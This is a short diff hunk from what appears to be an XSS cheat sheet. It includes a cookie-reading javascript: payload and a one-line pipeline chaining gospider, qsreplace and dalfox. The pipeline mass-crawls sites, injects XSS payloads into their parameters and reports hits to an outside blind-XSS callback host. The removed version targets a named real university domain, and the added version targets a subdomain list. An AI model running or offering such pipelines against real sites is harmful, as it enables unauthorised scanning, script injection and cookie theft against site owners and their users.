@@ -74,4 +74,4 @@ javascript:alert(document.cookie)
 
 # 1linerXSS
 
-    gospider -s "https://quizbyte.sharda.ac.in" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox -b astutehacker.xss.ht pipe -o result3.txt
+    gospider -S subdomains.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox -b astutehacker.xss.ht pipe -o result3.txt
